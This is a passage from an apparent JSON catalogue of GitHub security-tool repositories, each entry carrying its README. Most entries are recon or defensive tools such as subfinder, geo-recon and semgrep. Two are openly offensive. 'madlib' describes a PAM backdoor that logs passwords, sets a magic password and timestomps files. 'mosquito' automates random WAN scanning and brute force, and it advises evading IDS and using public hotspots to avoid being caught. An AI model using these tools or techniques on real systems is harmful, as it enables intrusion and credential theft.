hackerone.com -o output.json -oJ -nW\\n\\u25b6 cat output.json\\n\\n{\\\"host\\\":\\\"www.hackerone.com\\\",\\\"ip\\\":\\\"104.16.99.52\\\"}\\n{\\\"host\\\":\\\"mta-sts.hackerone.com\\\",\\\"ip\\\":\\\"185.199.108.153\\\"}\\n{\\\"host\\\":\\\"hackerone.com\\\",\\\"ip\\\":\\\"104.16.100.52\\\"}\\n{\\\"host\\\":\\\"mta-sts.managed.hackerone.com\\\",\\\"ip\\\":\\\"185.199.110.153\\\"}\\n```\\n\\n\\n**The new highlight of this release is the addition of stdin/stdout features.** Now, domains can be piped to subfinder and enumeration can be ran on them. For example -\\n\\n```sh\\n\\u25b6 echo hackerone.com | subfinder\\n\\u25b6 cat targets.txt | subfinder\\n```\\n\\nThe subdomains discovered can be piped to other tools too. For example, you can pipe the subdomains discovered by subfinder to httpx [httpx](https://github.com/projectdiscovery/httpx) which will then find running http servers on the host.\\n\\n```sh\\n\\u25b6 echo hackerone.com | subfinder -silent | httpx -silent\\n\\nhttp://hackerone.com\\nhttp://www.hackerone.com\\nhttp://docs.hackerone.com\\nhttp://api.hackerone.com\\nhttps://docs.hackerone.com\\nhttp://mta-sts.managed.hackerone.com\\n```\\n\\n## Running in a Docker Container\\n\\nYou can use the official dockerhub image at [subfinder](https://hub.docker.com/r/projectdiscovery/subfinder). Simply run -\\n\\n```sh\\n\\u25b6 docker pull projectdiscovery/subfinder\\n```\\n\\nThe above command will pull the latest tagged release from the dockerhub repository.\\n\\nIf you want to build the container yourself manually, git clone the repo, then build and run the following commands\\n\\n- Clone the repo using `git clone https://github.com/projectdiscovery/subfinder.git`\\n- Build your docker container\\n```sh\\ndocker build -t projectdiscovery/subfinder .\\n```\\n\\n- After building the container using either way, run the following -\\n```sh\\ndocker run -it projectdiscovery/subfinder\\n```\\n\\u25b6 The above command is the same as running `-h`\\n\\nIf you are using docker, you need to first create your directory structure holding subfinder configuration file. After modifying the default config.yaml file, you can run:\\n\\n```sh\\n\\u25b6 mkdir -p $HOME/.config/subfinder\\n\\u25b6 cp config.yaml $HOME/.config/subfinder/config.yaml\\n\\u25b6 nano $HOME/.config/subfinder/config.yaml\\n```\\n\\nAfter that, you can pass it as a volume using the following sample command.\\n```sh\\n\\u25b6 docker run -v $HOME/.config/subfinder:/root/.config/subfinder -it projectdiscovery/subfinder -d freelancer.com\\n```\\n\\nFor example, this runs the tool against uber.com and output the results to your host file system:\\n```sh\\ndocker run -v $HOME/.config/subfinder:/root/.config/subfinder -it projectdiscovery/subfinder -d uber.com > uber.com.txt\\n```\\n\\n# License\\n\\nsubfinder is made with \\ud83d\\udda4 by the [projectdiscovery](https://projectdiscovery.io) team. Community contributions have made the project what it is. See the **[Thanks.md](https://github.com/projectdiscovery/subfinder/blob/master/THANKS.md)** file for more details.\\n\\nRead the disclaimer for usage at [DISCLAIMER.md](https://github.com/projectdiscovery/subfinder/blob/master/DISCLAIMER.md) and [contact us](mailto:contact@projectdiscovery.io) for any API removal.\\n\"", "topics": ["bug-bounty", "reconaissance", "osint", "subdomain-enumeration", "subdomains"], "writeup": "", "ignoredescription": false, "id": 74, "full_name": "projectdiscovery/subfinder", "url": "https://github.com/projectdiscovery/subfinder", "topic_string": "bug-bounty reconaissance osint subdomain-enumeration subdomains"},
{"tags": [], "owner": "r00t-3xp10it", "description": "mosquito - Automating reconnaissance and brute force attacks", "name": "resource_files", "topics_string": "", "language": "Ruby", "readme": "\"## METASPLOIT RESOURCE FILES\\n\\n<blockquote>Resource scripts provides an easy way for us to automate repetitive tasks in Metasploit. Conceptually they're just like batch scripts, they contain a set of commands that are automatically and sequentially executed when you load the script in Metasploit. You can create a resource script by chaining together a series of Metasploit console commands or by directly embedding Ruby to do things like call APIs, interact with objects in the database, modules and iterate actions.</blockquote>\\n\\n**This repository contains various resource files to assiste in exploitation or metasploit database related issues.**<br />\\n![pic](http://u.cubeupload.com/pedroubuntu10/metasploit1024x480.jpg)\\n\\n<br />\\n\\n### DISCLAMER\\nThe resource scripts this repository contains serves as proof of concept (**POC**) of this [article](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files) published on resource files scripting. This repository is designed to demonstrate what resource files [ERB](https://www.offensive-security.com/metasploit-unleashed/custom-scripting/) can accomplish when automating tasks in msfconsole, and they are written to take advantage of multi-hosts-exploitation-scan tasks (manage large databases of hosts) from scanning the local lan for alive hosts, scan attackers input rhosts or scan wan networks in search of rhosts to exploit.\\n\\n\\n---\\n\\n<br />\\n\\n## Mosquito - Automating reconnaissance and brute force attacks\\n\\n![mosquito_banner](http://u.cubeupload.com/pedroubuntu10/mosquitobanner.png)\\n\\n<br />\\n\\n### Index\\n[1] [Project History](https://github.com/r00t-3xp10it/resource_files#project-history)<br />\\n[2] [Framework Description](https://github.com/r00t-3xp10it/resource_files#framework-description)<br />\\n[3] [Framework Dictionary files](https://github.com/r00t-3xp10it/resource_files#framework-dictionary-files)<br />\\n[4] [Framework Dependencies](https://github.com/r00t-3xp10it/resource_files#framework-dependencies)<br />\\n[5] [Framework Limitations](https://github.com/r00t-3xp10it/resource_files#framework-limitations)<br />\\n[6] [Framework Download](https://github.com/r00t-3xp10it/resource_files#framework-download)<br />\\n[7] [Framework help-update-install-execution](https://github.com/r00t-3xp10it/resource_files#framework-help-update-install-execution)<br />\\n[8] [Project Referencies url's](https://github.com/r00t-3xp10it/resource_files#referencies)<br />\\n[9] [Project Acknowledgment](https://github.com/r00t-3xp10it/resource_files#project-acknowledgment)<br />\\n[10] [Project releases description](https://github.com/r00t-3xp10it/resource_files/releases)<br />\\n\\n---\\n<br />\\n\\n### Project History\\nMosquito.sh (**BASH**) script was written for the purpose of automating the resource files (**ERB**) contained in this [repository](https://github.com/r00t-3xp10it/resource_files). Each resource file is written to allow users to run them in three different ways, from scan the Local Lan, scan user inputs (**RHOSTS/LHOSTS**) or randomly scan the **WAN** network for possible targets to add to metasploit database.\\n\\n![mosquito_banner](https://i.imgur.com/Ibrvsjk.png)\\n\\n**WARNING:** In 'Random search WAN for rhosts' its advice to use default **LIMMIT** values (4 to 5 minuts scan aprox.)\\n\\n---\\n<br />\\n\\n### Framework Description\\nMosquito as first step uses nmap to seach-recon hosts information (or possible targets), then adds all the hosts found (with open ports) to metasploit database to be used in further recon, exploration or brute force jobs carried out later with msf.\\n\\n![mosquito_banner](http://u.cubeupload.com/pedroubuntu10/mosquitorecon2.png)\\n![mosquito_banner](https://i.imgur.com/nbbhj5N.png)\\n![mosquito_banner](http://u.cubeupload.com/pedroubuntu10/mosquitorecon3.png)\\n\\nMosquito allow us to scan Local Lan or WAN networks using nmap (search-recon) and metasploit (recon-exploration-brute-force), but unlike msf the scans performed by nmap will use a fake UserAgent (IPhone/Safari) stealth scans (SYN ack) and Cloak scan(s) with decoys (-D decoy_ip,decoy_ip,ME) that makes forensic IDS analysis more dificult to identify the attack.\\n\\n![mosquito_banner](http://u.cubeupload.com/pedroubuntu10/mosquitoIDSevasion.png)\\n\\n**WARNING:** All this stealth technics will not prevent us from beeing caugth, so its advice to **not** use mosquito inside your home network (Local Lan), but insted find a public hotspot to use and abuse of mosquito framework.\\n\\n stealth technics used to evade IDS analysis\\n -------------------------------------------\\n nmap -sS [stealth scan using SYN ack]\\n nmap -D 188.234.11.254,167.113.24.80,ME [Cloak a scan with decoys]\\n nmap --script-args http.useragent=\\\"Apache-HttpClient/4.0.3 (java 1.5)\\\" [spoof your UserAgent]\\n\\nMosquito also allow us to search-scan-exploit-brute-force multiple targets at the same time (multi-tasking).\\n\\n![mosquito_multi_targets](https://i.imgur.com/r3BXpZa.png)\\n![mosquito_multi_targets](https://i.imgur.com/3noMbfS.png)\\n\\nAnd each valid credentials found (brute-force) will spawn a shell session to remote host.\\n\\n![mosquito_banner](http://u.cubeupload.com/pedroubuntu10/telnetbrutecreds.png)\\n![mosquito_banner](https://i.imgur.com/630IHhF.png)\\n\\n\\n[jump to top](https://github.com/r00t-3xp10it/resource_files#index)\\n\\n---\\n<br />\\n\\n### Framework Dictionary files\\nInitialy all resource scripts that this project contains are written to allow is users to input dictionary file absoluct path before the scan take place (own dictionary), but mosquito ships with is own set of dictionary files to assist in brute force tasks, and it does not allow is users to input another dictionary file when running mosquito framework.\\n\\nnevertheless mosquito users can still improve the existing dictionary(s) by edit them before executing the framework.<br />\\nAll dictionary files can be found in project working directory under: 'resource_files/bin/worldlists'.\\n\\n![mosquito_banner](http://u.cubeupload.com/pedroubuntu10/dic.png)\\n\\n[jump to top](https://github.com/r00t-3xp10it/resource_files#index)\\n\\n---\\n<br />\\n\\n### Framework Dependencies\\n|Dependencie|Function|Install|\\n|---|---|---|\\n|zenity|Bash script GUI interfaces|[zenity download](https://help.gnome.org/users/zenity/) * |\\n|nmap| WAN random search; recon | [nmap download](https://nmap.org/download.html) * |\\n|metasploit| msf database; recon; exploitation; brute force | [metasploit download](https://www.metasploit.com/download) |\\n|geoiplookup| hosts geo location | sudo apt-get install geoip-bin * |\\n|curl| hosts geo location | sudo apt-get install curl * |\\n|dig| ip address resolver | Linux native installed package ** |\\n|vulners.nse| CVE recon | mosquito native nse script * |\\n|freevulnsearch.nse| CVE recon | mosquito native nse script * |\\n|http-winrm.nse| http winrm recon | mosquito native nse script * |\\n\\n * ./mosquito.sh -i = to install all packages/scripts/modules\\n ** Linux native installed package = no need to install it\\n\\n**Hint:** All mosquito dependencies can be easy installed by runing: **sudo ./mosquito.sh -i**<br />\\nAdicionaly to the dependencies described above, diferent resource scripts requires diferent msf auxiliarys\\nor nmap nse adicional scripts installed, the -i switch in mosquito allow us to download/install all that extra modules fast and easy.\\n\\n[jump to top](https://github.com/r00t-3xp10it/resource_files#index)\\n\\n---\\n<br />\\n\\n### Framework Limitations\\n**a)** mosquito only accepts ip addr inputs, not domain names<br />\\n**b)** brute forcing takes time, use 'CTRL+C' to skip current task(s)<br />\\n**c)** mosquito dicionarys can be found in resource_files/bin/worldlists<br />\\n**d)** finding valid credentials sometimes fails to spawn a shell<br />\\n**e)** multiple sessions open (msf) migth slowdown your pc<br />\\n\\n**Hint:** This resource scripts requires that the msf database to be empty of hosts and services data. Thats the main reason why this scripts creates a new workspace named **'mosquito'** and stores all data inside that workspace while working, then the resource script deletes the **'mosquito'** workspace in the end of execution and leave *default database intact.\\n\\n[jump to top](https://github.com/r00t-3xp10it/resource_files#index)\\n\\n---\\n<br />\\n\\n### Framework Download\\n```\\n[download] git clone https://github.com/r00t-3xp10it/resource_files.git\\n[permitions] cd resource_files && find ./ -name \\\"*.sh\\\" -exec chmod +x {} \\\\;\\n```\\n\\n### Framework help-update-install-execution\\n\\n [help] sudo ./mosquito.sh -h\\n![mosquito_banner](https://i.imgur.com/TjoLWrh.png)\\n\\n [update] sudo ./mosquito.sh -u\\n![mosquito_banner](http://u.cubeupload.com/pedroubuntu10/mosquitoupdate.png)\\n\\n\\n[jump to top](https://github.com/r00t-3xp10it/resource_files#index)\\n\\n---\\n<br />\\n\\n### Referencies\\n[1] [Project home page](https://github.com/r00t-3xp10it/resource_files)<br />\\n[2] [Project wiki - dependencies](https://github.com/r00t-3xp10it/resource_files/wiki/Offensive-Resource_Files-%7C-Dependencies)<br />\\n[3] [offensive resource script - geo_location.rc](https://github.com/r00t-3xp10it/resource_files/wiki/Offensive-Resource_Files--%7C-Geo_Location)<br />\\n[4] [offensive resource script - post_exploitation.rc](https://github.com/r00t-3xp10it/resource_files/wiki/post_exploitation.rc-%7C-offensive-resource-script)<br />\\n[5] [hacking-material-books - metasploit_resource_files](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)<br />\\n\\n<br />\\n\\n### Project Acknowledgment\\n@fyodor - nmap framework<br />\\n@Hhdm - metasploit framework<br />\\n@gmedian - vulners.nse script<br />\\n@SeanWarnock - http-winrm.nse script<br />\\n@MathiasGut - freevulnsearch.nse script<br />\\n\\n[jump to top](https://github.com/r00t-3xp10it/resource_files#index)\\n\\n<br />\\n\\n## Suspicious Shell Activity redteam@2019\\n\"", "topics": ["offensive", "redteam", "offensive-scripts", "ruby-script", "metasploit", "resource-files"], "writeup": "This repository contains various resource files to assist in recon, exploitation, and metasploit database related issues.", "ignoredescription": true, "id": 75, "full_name": "r00t-3xp10it/resource_files", "url": "https://github.com/r00t-3xp10it/resource_files", "topic_string": "offensive redteam offensive-scripts ruby-script metasploit resource-files"},
{"tags": [], "owner": "radioactivetobi", "description": "An OSINT CLI tool desgined to fast track IP Reputation and Geo-locaton look up for Security Analysts.", "name": "geo-recon", "topics_string": "", "language": "Python", "readme": "\"# Geo-Recon\\nAn OSINT CLI tool desgined to fast track IP Reputation and Geo-locaton look up for Security Analysts.\\n\\n![GitHub Logo](/geo-recon.png)\\n\\n# Pre-requirements for Linux\\n\\n* Python3 ```bash sudo apt install python3 ```\\n* Pip3 ```bash sudo apt install python3-pip ```\\n\\nIf you don't use Debian or Ubuntu, search for their respective platforms (like yum and pacman)\\n\\n# Setup\\nThis tool is compactible with:\\n* Any Linux Operating System (Debian, Ubuntu, CentOS)\\n* Termux\\n\\n# Linux Setup\\n```bash\\ngit clone https://github.com/radioactivetobi/geo-recon.git\\ncd geo-recon\\nchmod +x geo-recon.py\\nsudo apt install python3-pip\\npip3 install -r requirements.txt\\n```\\n# Termux Setup \\n\\n[Link about python and pip on Termux](https://wiki.termux.com/wiki/Python) that comes with the pkg python\\n\\n```bash\\ngit clone https://github.com/radioactivetobi/geo-recon.git\\ncd geo-recon\\nchmod +x geo-recon.py\\npip3 install -r requirements.txt\\n```\\n# Sample Syntax Linux and Termux\\n```bash\\nroot@kali:~/geo-recon# python3 geo-recon.py 138.121.128.19\\n\\n\\u2591\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2557\\u2591\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2557\\u2591\\u2588\\u2588\\u2588\\u2588\\u2588\\u2557\\u2591\\u2003\\u2003\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2557\\u2591\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2557\\u2591\\u2588\\u2588\\u2588\\u2588\\u2588\\u2557\\u2591\\u2591\\u2588\\u2588\\u2588\\u2588\\u2588\\u2557\\u2591\\u2588\\u2588\\u2588\\u2557\\u2591\\u2591\\u2588\\u2588\\u2557\\n\\u2588\\u2588\\u2554\\u2550\\u2550\\u2550\\u2550\\u255d\\u2591\\u2588\\u2588\\u2554\\u2550\\u2550\\u2550\\u2550\\u255d\\u2588\\u2588\\u2554\\u2550\\u2550\\u2588\\u2588\\u2557\\u2003\\u2003\\u2588\\u2588\\u2554\\u2550\\u2550\\u2588\\u2588\\u2557\\u2588\\u2588\\u2554\\u2550\\u2550\\u2550\\u2550\\u255d\\u2588\\u2588\\u2554\\u2550\\u2550\\u2588\\u2588\\u2557\\u2588\\u2588\\u2554\\u2550\\u2550\\u2588\\u2588\\u2557\\u2588\\u2588\\u2588\\u2588\\u2557\\u2591\\u2588\\u2588\\u2551\\n\\u2588\\u2588\\u2551\\u2591\\u2591\\u2588\\u2588\\u2557\\u2591\\u2588\\u2588\\u2588\\u2588\\u2588\\u2557\\u2591\\u2591\\u2588\\u2588\\u2551\\u2591\\u2591\\u2588\\u2588\\u2551\\u2003\\u2003\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2554\\u255d\\u2588\\u2588\\u2588\\u2588\\u2588\\u2557\\u2591\\u2591\\u2588\\u2588\\u2551\\u2591\\u2591\\u255a\\u2550\\u255d\\u2588\\u2588\\u2551\\u2591\\u2591\\u2588\\u2588\\u2551\\u2588\\u2588\\u2554\\u2588\\u2588\\u2557\\u2588\\u2588\\u2551\\n\\u2588\\u2588\\u2551\\u2591\\u2591\\u255a\\u2588\\u2588\\u2557\\u2588\\u2588\\u2554\\u2550\\u2550\\u255d\\u2591\\u2591\\u2588\\u2588\\u2551\\u2591\\u2591\\u2588\\u2588\\u2551\\u2003\\u2003\\u2588\\u2588\\u2554\\u2550\\u2550\\u2588\\u2588\\u2557\\u2588\\u2588\\u2554\\u2550\\u2550\\u255d\\u2591\\u2591\\u2588\\u2588\\u2551\\u2591\\u2591\\u2588\\u2588\\u2557\\u2588\\u2588\\u2551\\u2591\\u2591\\u2588\\u2588\\u2551\\u2588\\u2588\\u2551\\u255a\\u2588\\u2588\\u2588\\u2588\\u2551\\n\\u255a\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2554\\u255d\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2557\\u255a\\u2588\\u2588\\u2588\\u2588\\u2588\\u2554\\u255d\\u2003\\u2003\\u2588\\u2588\\u2551\\u2591\\u2591\\u2588\\u2588\\u2551\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2588\\u2557\\u255a\\u2588\\u2588\\u2588\\u2588\\u2588\\u2554\\u255d\\u255a\\u2588\\u2588\\u2588\\u2588\\u2588\\u2554\\u255d\\u2588\\u2588\\u2551\\u2591\\u255a\\u2588\\u2588\\u2588\\u2551\\n\\u2591\\u255a\\u2550\\u2550\\u2550\\u2550\\u2550\\u255d\\u2591\\u255a\\u2550\\u2550\\u2550\\u2550\\u2550\\u2550\\u255d\\u2591\\u255a\\u2550\\u2550\\u2550\\u2550\\u255d\\u2591\\u2003\\u2003\\u255a\\u2550\\u255d\\u2591\\u2591\\u255a\\u2550\\u255d\\u255a\\u2550\\u2550\\u2550\\u2550\\u2550\\u2550\\u255d\\u2591\\u255a\\u2550\\u2550\\u2550\\u2550\\u255d\\u2591\\u2591\\u255a\\u2550\\u2550\\u2550\\u2550\\u255d\\u2591\\u255a\\u2550\\u255d\\u2591\\u2591\\u255a\\u2550\\u2550\\u255d\\n\\n By d3xt3r_182, @Hautly_idk\\n Github: https://github.com/radioactivetobi | Twitter: @d3xt3r_182, @Hautly_idk\\n Usage: python3 geo-recon.py <IPADDRESS> <OPTION>\\n \\n Use python3 geo-recon.py -h too see the options\\n \\n\\n\\n[*] Running Geo-location Check Against 138.121.128.19\\n\\nCountry: Brazil\\nRegion: Piaui\\nCity: Teresina\\nOrganization: Itech Telecom\\nISP: Itech Telecom\\n\\n[*] Geo-IP Lookup Complete!!!\\n\\n\\n[*] Running Reputation Check Against 138.121.128.19\\n\\nDomain: \\\"redeitechtelecom.com.br\\\"\\nHostname: []\\nUsage Type: \\\"Fixed Line ISP\\\"\\nConfidence of Abuse: 100\\nNumber Times of Reported: 982\\nLast Reported: \\\"2020-08-21T16:43:12+00:00\\\"\\nWhitelisted: false\\n\\nThe IP Address 138.121.128.19 Is Malicious and well known for SSH Bruteforce Attacks\\n\\n[*] IP Reputation Look up Complete!!!\\n```\\n\\n\\n# Things added by Hautly (SrJam):\\n\\n- Support for python3 and pip3.\\n- Now Geo-Recon no longer supports python below version 3.0 because it is deprecated, sorry.\\n- NMAP support with the --nmap or -n option after the IP number.\\n- Longitudinal latitude correction.\\n- Organization for the creation of new modules and separate and organized APIs.\\n- Add API MyIP for self consult, use: python3 geo-recon.py localhost (With -n or --nmap works too)\\n\\n\\n# To Do List\\n* [ OK ] Include Longitude & Latitude For Geo-IP Lookup\\n* [ OK ] Fix API\\n\\n\"", "topics": ["offensive", "ip-lookup", "osint", "geo", "reconnaissance", "geolocation"], "writeup": "", "ignoredescription": false, "id": 76, "full_name": "radioactivetobi/geo-recon", "url": "https://github.com/radioactivetobi/geo-recon", "topic_string": "offensive ip-lookup osint geo reconnaissance geolocation"},
{"tags": [], "owner": "rek7", "description": "PAM Backdoor", "name": "madlib", "topics_string": "", "language": "Python", "readme": "\"# madlib\\n## Features: \\n* Logs username/passwords to file\\n* Obfuscates backdoor password with bcrypt (helps make reverse engineering more difficult and string dumps less effective)\\n* Automatically updates the DPKG MD5 hashes for all moved/replaced files\\n* Time stomps all moved/replaced files\\n* Replaces /bin/false, and /bin/nologin with /bin/bash (effectively making any user able to ssh in)\\n## Requirements:\\n* Requires Python3\\n* Root privileges needed\\n## Default Entries:\\n* Username/passwords by default are logged to /usr/include/type.h\\n* The default magic password is secretpassxd\\n\\n\\n## Usage\\n\\nManually Specifying PAM Version:\\n\\n```\\nroot@homebase /h/r/madlib# ./pam.py \\\"1.3.0\\\"\\n .___.__ ._____.\\n _____ _____ __| _/| | |__\\\\_ |__\\n / \\\\\\\\__ \\\\ / __ | | | | || __ \\\\\\n| Y Y \\\\/ __ \\\\_/ /_/ | | |_| || \\\\_\\\\ \\\\\\n|__|_| (____ /\\\\____ | |____/__||___ /\\n \\\\/ \\\\/ \\\\/ \\\\/\\n https://github.com/rek7/madlib/\\n[00:15:55] [+] PAM TAR Download Completed\\n[00:15:56] [+] Finishing Extracting\\n[00:15:56] [+] Added Backdoor\\n[00:16:16] [+] Finished Compiling Tainted Lib\\n[00:16:16] [+] Finished Successfully Compiled PAM File Moved to: '/lib/x86_64-linux-gnu/security/pam_unix.so'\\n```\\n\\nAutomatic Version Detection:\\n\\n```\\nroot@homebase /h/r/madlib# ./pam.py\\n .___.__ ._____.\\n _____ _____ __| _/| | |__\\\\_ |__\\n / \\\\\\\\__ \\\\ / __ | | | | || __ \\\\\\n| Y Y \\\\/ __ \\\\_/ /_/ | | |_| || \\\\_\\\\ \\\\\\n|__|_| (____ /\\\\____ | |____/__||___ /\\n \\\\/ \\\\/ \\\\/ \\\\/\\n https://github.com/rek7/madlib/\\n[00:17:55] [!] Detected PAM Version: '1.3.0'\\n[00:17:55] [+] PAM TAR Download Completed\\n[00:17:56] [+] Finishing Extracting\\n[00:17:56] [+] Added Backdoor\\n[00:18:16] [+] Finished Compiling Tainted Lib\\n[00:18:16] [+] Finished Successfully Compiled PAM File Moved to: '/lib/x86_64-linux-gnu/security/pam_unix.so'\\n```\\n\"", "topics": [], "writeup": "Python script to compile a PAM backdoor on to the system. Features include logging credentials, backdoor password, and automatic install.", "ignoredescription": false, "id": 77, "full_name": "rek7/madlib", "url": "https://github.com/rek7/madlib", "topic_string": ""},
{"tags": [], "owner": "returntocorp", "description": "Lightweight static analysis for many languages. Find bug variants with patterns that look like source code.", "name": "semgrep", "topics_string": "", "language": "JavaScript", "readme": "\"<p align=\\\"center\\\">\\n <img src=\\\"semgrep.svg\\\" height=\\\"100\\\" alt=\\\"Semgrep logo\\\"/>\\n</p>\\n<h3 align=\\\"center\\\">\\n Lightweight static analysis for many languages.\\n </br>\\n Find and block bug variants with rules that look like source code.\\n</h3>\\n\\n<p align=\\\"center\\\">\\n <a href=\\\"#getting-started\\\">Getting Started</a>\\n <span> \\u00b7 </span>\\n <a href=\\\"#Examples\\\">Examples</a>\\n <span> \\u00b7 </span>\\n <a href=\\\"#resources\\\">Resources</a>\\n <br/>\\n <a href=\\\"#usage\\\">Usage</a>\\n <span> \\u00b7 </span>\\n <a href=\\\"#contributing\\\">Contributing</a>\\n <span> \\u00b7 </span>\\n <a href=\\\"#commercial-support\\\">Commercial Support</a>\\n</p>\\n\\n<p align=\\\"center\\\">\\n <a href=\\\"https://formulae.brew.sh/formula/semgrep\\\">\\n <img src=\\\"https://img.shields.io/homebrew/v/semgrep?style=flat-square\\\" alt=\\\"Homebrew\\\" />\\n </a>\\n <a href=\\\"https://pypi.org/project/semgrep/\\\">\\n <img alt=\\\"PyPI\\\" src=\\\"https://img.shields.io/pypi/v/semgrep?style=flat-square&color=blue\\\">\\n </a>\\n <a href=\\\"https://r2c.dev/slack\\\">\\n <img src=\\\"https://img.shields.io/badge/slack-join-green?style=flat-square\\\" alt=\\\"Issues welcome!\\\" />\\n </a>\\n <a href=\\\"https://github.com/returntocorp/semgrep/issues/new/choose\\\">\\n <img src=\\\"https://img.shields.io/badge/issues-welcome-green?style=flat-square\\\" alt=\\\"Issues welcome!\\\" />\\n </a>\\n <a href=\\\"https://github.com/returntocorp/semgrep#readme\\\">\\n <img src=\\\"https://img.shields.io/github/stars/returntocorp/semgrep?label=GitHub%20Stars&style=flat-square\\\" alt=\\\"1500+ GitHub stars\\\" />\\n </a>\\n</p>\\n\\nSemgrep tl;dr:\\n\\n- A simple, customizable, and fast static analysis tool for finding bugs\\n- Combines the speed and customization of `grep` with the precision of traditional static analysis tools\\n- No painful domain-specific language; Semgrep rules look like the source code you\\u2019re targeting\\n- Batteries included with hundreds of existing community rules for OWASP Top 10 issues and common mistakes\\n- Runs in CI, at pre-commit, or in the editor\\n- Runs offline on uncompiled code\\n\\nSemgrep supports:\\n\\n| Go | Java | JavaScript | JSON | Python | Ruby (beta) | JSX (beta) | C (alpha) | OCaml (alpha) |\\n| --- | ---- | ---------- | ---- | ------ | ----------- | ---------- | --------- | ------------- |\\n\\n\\nSemgrep is proudly supported by r2c. Learn more about a hosted version of Semgrep with an enterprise feature set at [r2c.dev](https://r2c.dev/).\\n\\n## Getting Started\\n\\nThe best place to start with Semgrep and rule writing is its [Quick Start](https://semgrep.dev/editor). For a more in-depth introduction to its syntax and use cases visit the [Semgrep Tutorial](https://semgrep.dev/learn).\\n\\nSemgrep can be installed using `brew`, `pip`, or `docker`:\\n\\n```sh\\n# For macOS\\n$ brew install semgrep\\n\\n# On Ubuntu/WSL/linux, we recommend installing via `pip`\\n$ python3 -m pip install semgrep\\n\\n# To try Semgrep without installation run via Docker\\n$ docker run --rm -v \\\"${PWD}:/src\\\" returntocorp/semgrep --help\\n```\\n\\nTo confirm installation and get an overview of Semgrep's functionality run with `--help`:\\n\\n```\\n$ semgrep --help\\n```\\n\\nOnce installed, Semgrep can be run with single rule patterns or entire rule packs:\\n\\n```sh\\n# Check for Python == where the left and right hand sides are the same (often a bug)\\n$ semgrep -e '$X == $X' --lang=py path/to/src\\n\\n# Run a ruleset with rules for many languages\\n$ semgrep --config=https://semgrep.dev/p/r2c-CI path/to/src\\n```\\n\\nExplore the Semgrep Registry of rules and CI integrations at [semgrep.dev](https://semgrep.dev/packs).\\n\\n## Examples\\n\\n| Use case | Semgrep rule |\\n| :-------------------------------- | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\\n| Ban dangerous APIs | [Prevent use of exec](https://semgrep.live/clintgibler:no-exec) |\\n| Search routes and authentiation | [Extract Spring routes](https://semgrep.live/clintgibler:spring-routes) |\\n| Enforce the use secure defaults | [Securely set Flask cookies](https://semgrep.dev/dlukeomalley:flask-set-cookie) |\\n| Enforce project best-practices | [Use assertEqual for == checks](https://semgrep.dev/dlukeomalley:use-assertEqual-for-equality), [Always check subprocess calls](https://semgrep.dev/dlukeomalley:unchecked-subprocess-call) |\\n| Codify project-specific knowledge | [Verify transactions before making them](https://semgrep.dev/dlukeomalley:verify-before-make) |\\n| Audit security hotspots | [Finding XSS in Apache Airflow](https://semgrep.live/ievans:airflow-xss), [Hardcoded credentials](https://semgrep.dev/dlukeomalley:hardcoded-credentials) |\\n| Audit configuration files | [Find S3 ARN uses](https://semgrep.dev/dlukeomalley:s3-arn-use) |\\n| Migrate from deprecated APIs | [DES is deprecated](https://semgrep.dev/editor?registry=java.lang.security.audit.crypto.des-is-deprecated), [Deprecated Flask APIs](https://semgrep.dev/editor?registry=python.flask.maintainability.deprecated.deprecated-apis), [Deprecated Bokeh APIs](https://semgrep.dev/editor?registry=python.bokeh.maintainability.deprecated.deprecated_apis) |\\n| Apply automatic fixes | [Use listenAndServeTLS](https://semgrep.live/clintgibler:use-listenAndServeTLS) |\\n\\n### Try it out\\n\\nGive some rule packs a spin by running on known vulnerable repositories:\\n\\n```bash\\n# juice-shop, a vulnerable Node.js + Express app\\n$ git clone https://github.com/bkimminich/juice-shop\\n$ semgrep -f https://semgrep.dev/p/r2c-security-audit juice-shop\\n```\\n\\n```bash\\n# railsgoat, a vulnerable Ruby on Rails app\\n$ git clone https://github.com/OWASP/railsgoat\\n$ semgrep -f https://semgrep.dev/p/r2c-security-audit railsgoat\\n```\\n\\n```bash\\n# govwa, a vulnerable Go app\\n$ git clone https://github.com/0c34/govwa\\n$ semgrep -f https://semgrep.dev/p/r2c-security-audit govwa\\n```\\n\\n```bash\\n# vulnerable Python+Flask app\\n$ git clone https://github.com/we45/Vulnerable-Flask-App\\n$ semgrep -f https://semgrep.dev/p/r2c-security-audit Vulnerable-Flask-App\\n```\\n\\n```bash\\n# WebGoat, a vulnerable Java+Sprint app\\n$ git clone https://github.com/WebGoat/WebGoat\\n$ semgrep -f https://semgrep.dev/p/r2c-security-audit WebGoat\\n```\\n\\n## Resources\\n\\nLearn more:\\n\\n- [Live Editor](https://semgrep.dev/editor)\\n- [Semgrep Registry](https://semgrep.dev/r)\\n- [Documentation](docs/README.md)\\n- [r2c YouTube channel](https://www.youtube.com/channel/UC5ahcFBorwzUTqPipFhjkWg) for more videos.\\n\\nGet in touch:\\n\\n- Submit a [bug report](https://github.com/returntocorp/semgrep/issues)\\n- Join the [Semgrep Slack](https://r2c.dev/slack) to say \\\"hi\\\" or ask questions\\n\\n## Usage\\n\\n### Command Line Options\\n\\nSee `semgrep --help` for command line options.\\n\\n### Exit Codes\\n\\n`semgrep` may exit with the following exit codes:\\n\\n- `0`: Semgrep ran successfully and found no errors\\n- `1`: Semgrep ran successfully and found issues in your code\\n- \\\\>=`2`: Semgrep failed to run\\n\\n### Upgrading\\n\\nTo upgrade, run the command below associated with how you installed Semgrep:\\n\\n```sh\\n# Using HomeBrew\\n$ brew upgrade semgrep\\n\\n# Using `pip`\\n$ python3 -m pip install --upgrade semgrep\\n\\n# Using Docker\\n$ docker pull returntocorp/semgrep:latest\\n```\\n\\n## Contributing\\n\\nSemgrep is LGPL-licensed, feel free to help out: 